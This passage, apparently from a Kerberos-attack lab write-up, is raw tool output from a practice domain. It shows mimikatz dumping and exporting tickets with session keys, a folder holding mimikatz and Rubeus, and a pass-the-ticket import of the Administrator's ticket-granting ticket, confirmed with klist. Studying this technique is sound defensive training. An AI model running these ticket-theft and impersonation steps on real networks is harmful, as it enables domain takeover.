Logon Time        : 8/15/2025 8:44:05 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             4d2746474872c743234458d25f6f1e9d3cc357d68644d2b9404b2c75c36ede82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;35691]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:29 AM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60903 (00000000:0000ede7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:29 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e
 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e
 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b
 d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd
 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86
 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33414 (00000000:00008286)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:26 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e
 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e
 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b
 d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd
 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86
 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:16 AM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 8/15/2025 9:15:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             927bdc8de336b9629bcc4bba77234246dbb687a42e0bc0509d3673bef6eab5d2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 8/15/2025 8:58:36 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             99a3b6d95b0ab701f6d27ff6833e8e0bc14f1f231fe66995072924a7706d5006
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 8/15/2025 8:53:19 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             75524587926b62f80b6bdb47ac0d5711280925957c576752c47fc5acd347997c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi !
         [00000003]
           Start/End/MaxRenew: 8/15/2025 8:44:32 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             497a0c8cb433a851738e572ee5f2892987607fc64a3038e95d1d8b66cb3060da
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000.kirbi !
         [00000004]
           Start/End/MaxRenew: 8/15/2025 8:44:32 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9f3376464bdfcc7357e5593d91b14bf4269b6c0badedcdb29107430fa103a973
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000005]
           Start/End/MaxRenew: 8/15/2025 8:44:12 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9384245dea179773ad3536ee221a46b93f39a1d719d1b5db6441599524f51dfc
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000006]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             e12d6c45ca02e563b9f2f42bb730ee40e125f703e3e1a9123d7e586eeb37dff0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-6-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !
         [00000007]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac       
             9560b3cdd30e5c1951573ec453b539b6399bd92fdcbfdf4d54908d30ccd1daad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-7-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !
 
        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 11:12:56 AM ; 8/15/2025 11:27:56 AM ; 8/22/2025 8:44:05 AM
           Service Name (01) : controller-1$ ; @ (null)
           Target Name  (10) : administrator@CONTROLLER.local ; @ (null)
           Client Name  (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL
           Flags 00a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             50366c059140ebaaf3dcc6f9dd8191a9186a75d2ecc29bf748289d70d8b0e5c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-1-0-00a50000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             4d2746474872c743234458d25f6f1e9d3cc357d68644d2b9404b2c75c36ede82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             bd958237ab56423aff6d46208817e77bb564e33f4a60ef6f97d2c8d0361ab09a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
```

```sh
C:\Users\Administrator\Downloads>dir 
 Volume in drive C has no label. 
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

08/15/2025  03:11 PM    <DIR>          .
08/15/2025  03:11 PM    <DIR>          ..
08/15/2025  02:39 PM             6,037 hashes.txt
08/15/2025  01:10 PM             1,374 Machine1.kirbi
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
08/15/2025  03:14 PM             1,787 [0;1a13b5]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,587 [0;28f202]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,755 [0;3530d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,587 [0;35691]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,595 [0;36e311]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,761 [0;3d7361]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi
08/15/2025  03:14 PM             1,759 [0;3d7361]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi
08/15/2025  03:14 PM             1,595 [0;3d7361]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,791 [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,587 [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,755 [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,787 [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,721 [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi
08/15/2025  03:14 PM             1,711 [0;3e7]-0-3-40a50000.kirbi
08/15/2025  03:14 PM             1,791 [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,791 [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,721 [0;3e7]-0-6-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi
08/15/2025  03:14 PM             1,755 [0;3e7]-0-7-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,647 [0;3e7]-1-0-00a50000.kirbi
08/15/2025  03:14 PM             1,587 [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,587 [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
08/15/2025  03:14 PM             1,755 [0;618d3]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,755 [0;6192f]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
08/15/2025  03:14 PM             1,791 [0;6196b]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi 
08/15/2025  03:14 PM             1,755 [0;619a4]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
              29 File(s)      1,526,484 bytes
               2 Dir(s)  50,908,475,392 bytes free

```

```sh
mimikatz # kerberos::ptt [0;36e311]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;36e311]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
```

```sh
C:\Users\Administrator\Downloads>klist

Current LogonId is 0:0x3d7361

Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/15/2025 10:58:44 (local)
        End Time:   8/15/2025 20:58:44 (local)
        Renew Time: 8/22/2025 10:58:44 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/15/2025 14:05:59 (local)
        End Time:   8/15/2025 21:12:59 (local)
        Renew Time: 8/22/2025 11:12:59 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/15/2025 14:05:58 (local)
        End Time:   8/15/2025 21:12:59 (local)
        Renew Time: 8/22/2025 11:12:59 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1
```

